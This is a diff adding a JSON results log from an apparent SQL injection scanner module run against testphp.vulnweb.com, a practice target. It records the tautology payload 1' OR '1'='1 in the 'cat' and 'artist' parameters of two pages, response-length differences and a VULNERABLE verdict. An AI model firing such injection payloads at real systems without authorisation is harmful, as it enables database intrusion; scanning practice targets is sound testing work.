@@ -1,0 +1,90 @@
+{
+    "module": "rm_mod_002_sqli.py",
+    "module_path": "modules\\rm_mod_002_sqli.py",
+    "target": "http://testphp.vulnweb.com/",
+    "started_at": "2025-11-10T20:54:52.861366Z",
+    "stdout": "{\n  \"module\": \"rm_mod_002_sqli\",\n  \"target\": \"http://testphp.vulnweb.com\",\n  \"vulnerable\": true,\n  \"findings\": [\n    {\n      \"path\": \"/listproducts.php\",\n      \"payload\": {\n        \"cat\": \"1' OR '1'='1\"\n      },\n      \"len_diff\": 5730,\n      \"error_like\": true\n    },\n    {\n      \"path\": \"/artists.php\",\n      \"payload\": {\n        \"cat\": \"1' OR '1'='1\"\n      },\n      \"len_diff\": 0,\n      \"error_like\": true\n    },\n    {\n      \"path\": \"/listproducts.php\",\n      \"payload\": {\n        \"artist\": \"1' OR '1'='1\"\n      },\n      \"len_diff\": 5844,\n      \"error_like\": true\n    },\n    {\n      \"path\": \"/artists.php\",\n      \"payload\": {\n        \"artist\": \"1' OR '1'='1\"\n      },\n      \"len_diff\": 4067,\n      \"error_like\": true\n    }\n  ],\n  \"debug\": [\n    {\n      \"path\": \"/listproducts.php\",\n      \"good_status\": 200,\n      \"bad_status\": 200,\n      \"good_len\": 7880,\n      \"bad_len\": 2150,\n      \"len_diff\": 5730,\n      \"err_like\": true\n    },\n    {\n      \"path\": \"/artists.php\",\n      \"good_status\": 200,\n      \"bad_status\": 200,\n      \"good_len\": 5328,\n      \"bad_len\": 5328,\n      \"len_diff\": 0,\n      \"err_like\": true\n    },\n    {\n      \"path\": \"/listproducts.php\",\n      \"good_status\": 200,\n      \"bad_status\": 200,\n      \"good_len\": 7994,\n      \"bad_len\": 2150,\n      \"len_diff\": 5844,\n      \"err_like\": true\n    },\n    {\n      \"path\": \"/artists.php\",\n      \"good_status\": 200,\n      \"bad_status\": 200,\n      \"good_len\": 6251,\n      \"bad_len\": 2184,\n      \"len_diff\": 4067,\n      \"err_like\": true\n    }\n  ]\n}\n",
+    "stderr": "",
+    "exit_code": 0,
+    "parsed_json": {
+        "module": "rm_mod_002_sqli",
+        "target": "http://testphp.vulnweb.com",
+        "vulnerable": true,
+        "findings": [
+            {
+                "path": "/listproducts.php",
+                "payload": {
+                    "cat": "1' OR '1'='1"
+                },
+                "len_diff": 5730,
+                "error_like": true
+            },
+            {
+                "path": "/artists.php",
+                "payload": {
+                    "cat": "1' OR '1'='1"
+                },
+                "len_diff": 0,
+                "error_like": true
+            },
+            {
+                "path": "/listproducts.php",
+                "payload": {
+                    "artist": "1' OR '1'='1"
+                },
+                "len_diff": 5844,
+                "error_like": true
+            },
+            {
+                "path": "/artists.php",
+                "payload": {
+                    "artist": "1' OR '1'='1"
+                },
+                "len_diff": 4067,
+                "error_like": true
+            }
+        ],
+        "debug": [
+            {
+                "path": "/listproducts.php",
+                "good_status": 200,
+                "bad_status": 200,
+                "good_len": 7880,
+                "bad_len": 2150,
+                "len_diff": 5730,
+                "err_like": true
+            },
+            {
+                "path": "/artists.php",
+                "good_status": 200,
+                "bad_status": 200,
+                "good_len": 5328,
+                "bad_len": 5328,
+                "len_diff": 0,
+                "err_like": true
+            },
+            {
+                "path": "/listproducts.php",
+                "good_status": 200,
+                "bad_status": 200,
+                "good_len": 7994,
+                "bad_len": 2150,
+                "len_diff": 5844,
+                "err_like": true
+            },
+            {
+                "path": "/artists.php",
+                "good_status": 200,
+                "bad_status": 200,
+                "good_len": 6251,
+                "bad_len": 2184,
+                "len_diff": 4067,
+                "err_like": true
+            }
+        ]
+    },
+    "conclusion": "VULNERABLE",
+    "reason": "module reported vulnerable",
+    "error": null,
+    "finished_at": "2025-11-10T20:54:56.200508Z"
+}
